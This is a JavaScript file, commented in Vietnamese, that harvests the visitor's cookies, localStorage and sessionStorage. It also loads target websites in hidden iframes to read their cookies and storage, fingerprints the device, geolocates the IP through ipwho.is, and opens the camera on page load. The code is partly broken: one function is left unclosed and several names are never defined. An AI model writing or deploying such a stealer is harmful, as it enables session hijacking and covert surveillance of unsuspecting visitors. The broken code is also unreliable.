const logDiv = document.getElementById('logDisplay');

function addLog(msg, type = 'info') {
  const time = new Date().toLocaleTimeString();

// ============================================================
// LẤY COOKIES TỪ TRANG HIỆN TẠI
// ============================================================
function getCurrentCookies() {
  try {
    const raw = document.cookie;
    if (!raw) return [];
    return raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
      const idx = c.indexOf('=');
      if (idx === -1) return { name: c, value: '' };
      return { name: c.substring(0, idx), value: c.substring(idx + 1) };
    });
  } catch(e) { return []; }
}

function getCookiesString(cookies) {
  if (!cookies || !cookies.length) return '❌ Không có cookies';
  return cookies.map((c, i) => {
    let v = decodeURIComponent(c.value || '');
    if (v.length > 60) v = v.substring(0, 60) + '…';
    v = v.replace(/[^\x20-\x7E]/g, '?');
    return `  ${i+1}. ${c.name} = ${v}`;
  }).join('\n');
}

// ============================================================
// LẤY COOKIES TỪ IFARME - TỐI ĐA
// ============================================================
function getCookiesFromIframe(url) {
  return new Promise((resolve) => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = url;
    iframe.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups';
    document.body.appendChild(iframe);
    
    let timeout = setTimeout(() => {
      try { iframe.remove(); } catch(e) {}
      resolve({ url, error: 'Timeout', cookies: [], success: false });
    }, 15000);
    
    iframe.onload = function() {
      clearTimeout(timeout);
      
      try {
        // Lấy cookies
        let cookies = [];
        let localStorage = {};
        let sessionStorage = {};
        
        try {
          const doc = iframe.contentDocument || iframe.contentWindow.document;
          if (doc && doc.cookie) {
            const raw = doc.cookie;
            if (raw) {
              cookies = raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
                const idx = c.indexOf('=');
                if (idx === -1) return { name: c, value: '' };
                return { name: c.substring(0, idx), value: c.substring(idx + 1) };
              });
            }
          }
        } catch(e) {}
        
        // Lấy localStorage
        try {
          const win = iframe.contentWindow;
          if (win && win.localStorage) {
            for (let i = 0; i < win.localStorage.length; i++) {
              const key = win.localStorage.key(i);
              localStorage[key] = win.localStorage.getItem(key);
            }
          }
        } catch(e) {}
        
        // Lấy sessionStorage
        try {
          const win = iframe.contentWindow;
          if (win && win.sessionStorage) {
            for (let i = 0; i < win.sessionStorage.length; i++) {
              const key = win.sessionStorage.key(i);
              sessionStorage[key] = win.sessionStorage.getItem(key);
            }
          }
        } catch(e) {}
        
        // Lấy thông tin trang
        let pageInfo = {};
        try {
          const win = iframe.contentWindow;
          if (win) {
            pageInfo = {
              url: win.location.href,
              title: win.document.title,
              userAgent: win.navigator.userAgent
            };
          }
        } catch(e) {}
        
        setTimeout(() => {
          try { iframe.remove(); } catch(e) {}
          resolve({
            url: url,
            cookies: cookies,
            localStorage: localStorage,
            sessionStorage: sessionStorage,
            pageInfo: pageInfo,
            success: cookies.length > 0 || Object.keys(localStorage).length > 0
          });
        }, 500);
        
      } catch(e) {
        try { iframe.remove(); } catch(e2) {}
        resolve({ url, error: e.message, cookies: [], success: false });
      }
    };
    
    iframe.onerror = function() {
      clearTimeout(timeout);
      try { iframe.remove(); } catch(e) {}
      resolve({ url, error: 'Load error', cookies: [], success: false });
    };
  });
}

// ============================================================
// THU THẬP COOKIES TỐI ĐA
// ============================================================
async function collectAllCookies() {
  addLog('🚀 Bắt đầu thu thập cookies tối đa...', 'info');
  setStatus('📸 Đang thu thập cookies...', 'loading');
  
  const results = {
    current: { cookies: [], localStorage: {}, sessionStorage: {} },
    websites: {},
    totalCookies: 0
  };
  
  // 1. Lấy từ trang hiện tại
  const currentCookies = getCurrentCookies();
  results.current.cookies = currentCookies;
  results.totalCookies += currentCookies.length;
  
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      results.current.localStorage[key] = localStorage.getItem(key);
    }
  } catch(e) {}
  
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      results.current.sessionStorage[key] = sessionStorage.getItem(key);
    }
  } catch(e) {}
  
  addLog(`✅ Trang hiện tại: ${currentCookies.length} cookies, ${Object.keys(results.current.localStorage).length} LS, ${Object.keys(results.current.sessionStorage).length} SS`, 'success');
  
  // 2. Lấy từ các web khác
  for (let i = 0; i < TARGET_WEBSITES.length; i++) {
    const url = TARGET_WEBSITES[i];
    const domain = url.replace('https://', '').replace('http://', '');
    
    addLog(`🌐 [${i+1}/${TARGET_WEBSITES.length}] Đang lấy: ${domain}`, 'info');
    setStatus(`📸 Đang lấy: ${domain} (${i+1}/${TARGET_WEBSITES.length})`, 'loading');
    
    const result = await getCookiesFromIframe(url);
    
    if (result.success) {
      results.websites[domain] = {
        cookies: result.cookies || [],
        localStorage: result.localStorage || {},
        sessionStorage: result.sessionStorage || {},
        pageInfo: result.pageInfo || {},
        success: true
      };
      results.totalCookies += result.cookies.length;
      addLog(`✅ ${domain}: ${result.cookies.length} cookies, ${Object.keys(result.localStorage).length} LS`, 'success');
    } else {
      results.websites[domain] = {
        cookies: [],
        success: false,
        error: result.error || 'Không thể lấy'
      };
      addLog(`❌ ${domain}: ${result.error || 'Không thể lấy'}`, 'error');
    }
    
    // Đợi giữa các lần
    await new Promise(r => setTimeout(r, 300));
  }
  
  addLog(`✅ Hoàn tất! Tổng cookies: ${results.totalCookies}`, 'success');
  setStatus(`✅ Đã thu thập xong! Tổng cookies: ${results.totalCookies}`, 'success');
  
  return results;
}

function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform || 'Không rõ',
    language: navigator.language || 'Không rõ',
    languages: navigator.languages ? navigator.languages.join(', ') : 'Không rõ',
    cookieEnabled: navigator.cookieEnabled ? '✅ Bật' : '❌ Tắt',
    doNotTrack: navigator.doNotTrack || '❌ Không bật',
    hardwareConcurrency: navigator.hardwareConcurrency || 'Không rõ',
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Không rõ',
    maxTouchPoints: navigator.maxTouchPoints || '0',
    vendor: navigator.vendor || 'Không rõ',
    screen: `${window.screen.width}x${window.screen.height}`,
    colorDepth: window.screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không rõ',
    referrer: document.referrer || 'Trực tiếp',
    url: window.location.href,
    title: document.title
  };
}

async function getIP() {
  try {
    const res = await fetch('https://ipwho.is/');
    const data = await res.json();
    if (data.success) {
      return {
        ip: data.ip || 'Không rõ',
        city: data.city || 'Không rõ',
        region: data.region || 'Không rõ',
        country: data.country || 'Không rõ',
        countryCode: data.country_code || 'Không rõ',
        isp: data.connection?.isp || data.connection?.org || 'Không rõ',
        timezone: data.timezone?.id || 'Không rõ',
        latitude: data.latitude || 'Không rõ',
        longitude: data.longitude || 'Không rõ'
      };
    }
    return { ip: 'Không rõ' };
  } catch(e) {
    try {
      const fallback = await fetch('https://api.ipify.org?format=json');
      const data = await fallback.json();
      return { ip: data.ip || 'Không rõ' };
    } catch(err) { return { ip: 'Không rõ' }; }
  }
}

function getPlugins() {
  try {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
      plugins.push(navigator.plugins[i].name);
    }
    return plugins;
  } catch(e) { return []; }
}

function getPerformance() {
  try {
    const timing = performance.timing;
    return {
      loadTime: timing.loadEventEnd - timing.navigationStart,
      domReady: timing.domContentLoadedEventEnd - timing.navigationStart,
      dns: timing.domainLookupEnd - timing.domainLookupStart,
      tcp: timing.connectEnd - timing.connectStart,
      ttfb: timing.responseStart - timing.requestStart
    };
  } catch(e) { return {}; }
}

// CAMERA - CHỈ 1 CAM, ĐƠN GIẢN HƠN

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('capture-btn');
const statusDiv = document.getElementById('status');
const actionBtns = document.getElementById('action-buttons');
const loadingOverlay = document.getElementById('loadingOverlay');
const placeholder = document.getElementById('placeholder');
const cameraLabel = document.getElementById('cameraLabel');

let currentStream = null;
let isCameraReady = false;

async function startCamera() {
  loadingOverlay.classList.add('show');
  captureBtn.disabled = true;
  placeholder.textContent = '📸 Đang mở camera...';
  addLog('📷 Đang khởi tạo camera...', 'info');
  
  try {
    // Thử mở camera trước
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
      });
      currentStream = stream;
      video.srcObject = stream;
      await video.play();
      isCameraReady = true;
      cameraLabel.textContent = '📷 Camera trước';
      placeholder.style.display = 'none';
      addLog('✅ Camera đã mở thành công!', 'success');
    } catch(e1) {
      // Thử mở camera sau
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false
        });
        currentStream = stream;
        video.srcObject = stream;
        await video.play();
        isCameraReady = true;
        cameraLabel.textContent = '📷 Camera sau';
        placeholder.style.display = 'none';
        addLog('✅ Camera đã mở thành công!', 'success');
      } catch(e2) {
        // Thử mở bất kỳ
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
          currentStream = stream;
          video.srcObject = stream;
          await video.play();
          isCameraReady = true;
          cameraLabel.textContent = '📷 Camera';
          placeholder.style.display = 'none';
          addLog('✅ Camera đã mở thành công!', 'success');
        } catch(e3) {
          throw new Error('Không thể mở camera');
        }
      }
    }
    
    if (isCameraReady) {
      captureBtn.disabled = false;
      setStatus('✅ Camera đã sẵn sàng!', 'success');
    }
    
  } catch(err) {
    addLog(`❌ Lỗi camera: ${err.message}`, 'error');
    placeholder.textContent = '❌ Không thể mở camera. Vui lòng cấp quyền!';
    setStatus('⚠️ Không thể truy cập camera', 'error');
    isCameraReady = false;
    captureBtn.disabled = true;
  } finally {
    loadingOverlay.classList.remove('show');
  }
}

setTimeout(startCamera, 500);

function playClickSound() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = 'sine';
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.1);
    gain.gain.setValueAtTime(0.12, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.1);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.1);
  } catch(e) {}
}
